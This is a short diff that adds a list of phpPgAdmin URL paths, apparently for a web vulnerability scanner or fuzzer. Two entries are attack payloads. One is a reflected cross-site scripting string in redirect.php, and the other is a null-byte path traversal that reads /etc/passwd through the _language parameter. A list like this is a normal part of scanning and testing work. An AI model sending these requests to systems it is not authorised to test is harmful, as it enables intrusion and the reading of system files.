@@ -1,0 +1,5 @@
+
+/phppgadmin/
+/phppgadmin/intro.php
+/redirect.php/%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E?subject=server&server=test
+/phpPgAdmin/index.php?_language=../../../../../../../../etc/passwd%00
